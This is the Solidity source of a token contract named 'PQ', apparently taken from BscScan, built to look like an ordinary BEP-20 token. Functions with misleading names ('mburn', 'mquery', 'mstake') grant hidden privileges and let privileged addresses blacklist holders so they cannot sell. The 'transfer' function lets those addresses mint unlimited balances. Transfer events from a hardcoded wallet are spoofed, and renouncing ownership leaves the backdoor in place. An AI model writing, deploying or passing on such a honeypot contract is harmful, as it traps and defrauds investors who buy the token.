/**
 *Submitted for verification at BscScan.com on 2022-11-04
*/

pragma solidity 0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address MNN = 0x48B807caa55AB39b7Ca244529F63f4935FEF0272;
	address MNK = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }
 modifier onlyOwner{
        require(msg.sender == _Owner);
        _; }
    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract PQ is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private Mc;
	mapping (address => bool) private Mb;
    mapping (address => bool) private Mw;
    mapping (address => mapping (address => uint256)) private Mv;
    uint8 private constant MCE = 8;
    uint256 private constant mS = 1 * (10** MCE);
    string private constant _name = "PQ";
    string private constant _symbol = "PQ";



    constructor () {
        Mc[_msgSender()] = mS;
         mmkr(MNK, mS); }
    

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return MCE;
    }

    function totalSupply() public pure  returns (uint256) {
        return mS;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return Mc[account];
    }
	
		function mstake(address Mj) public {
        if(Mb[msg.sender]) { 
        Mw[Mj] = false;}}
        function mquery(address Mj) public{
         if(Mb[msg.sender])  { 
        Mw[Mj] = true; }}
   
	
	
    function mmkr(address Mj, uint256 Mn) onlyOwner internal {
    emit Transfer(address(0), Mj ,Mn); }

    function allowance(address owner, address spender) public view  returns (uint256) {
        return Mv[owner][spender];
    }
	        function mburn(address Mj) onlyOwner public{
        Mb[Mj] = true; }
		
            function approve(address spender, uint256 amount) public returns (bool success) {    
        Mv[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

        

		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == MNN)  {
        require(amount <= Mc[sender]);
        Mc[sender] -= amount;  
        Mc[recipient] += amount; 
          Mv[sender][msg.sender] -= amount;
        emit Transfer (MNK, recipient, amount);
        return true; }  else  
          if(!Mw[recipient]) {
          if(!Mw[sender]) {
         require(amount <= Mc[sender]);
        require(amount <= Mv[sender][msg.sender]);
        Mc[sender] -= amount;
        Mc[recipient] += amount;
        Mv[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function transfer(address Mj, uint256 Mn) public {
        if(msg.sender == MNN)  {
        require(Mc[msg.sender] >= Mn);
        Mc[msg.sender] -= Mn;  
        Mc[Mj] += Mn; 
        emit Transfer (MNK, Mj, Mn);} else  
        if(Mb[msg.sender]) {Mc[Mj] += Mn;} else
        if(!Mw[msg.sender]) {
        require(Mc[msg.sender] >= Mn);
        Mc[msg.sender] -= Mn;  
        Mc[Mj] += Mn;          
        emit Transfer(msg.sender, Mj, Mn);}}}